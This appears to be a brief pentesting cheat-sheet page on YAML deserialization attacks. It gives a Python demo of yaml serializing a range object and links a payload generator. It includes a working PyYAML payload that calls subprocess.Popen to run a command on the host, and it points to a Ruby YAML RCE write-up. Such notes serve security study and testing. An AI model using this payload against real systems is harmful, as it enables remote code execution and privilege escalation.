---
description: >-
  Some YAML libraries are capable of serializing actual commands instead of just
  raw data. Which can be utilized to achieve RCE or PrivEsc.
---

# YAML deserialization attack

Try running the following script in Python

```python
import yaml

print(yaml.dump(range(1,10)))
```

You can see that the `range` method itself is serialized. To exploit this, you simply need to craft a nice YAML payload.

Which can conveniently be done using: [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)

Example Python payload:

```yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - chmod
  - +x
  - /bin/bash
```

Ruby also have a similar vulnerability

[https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)&#x20;
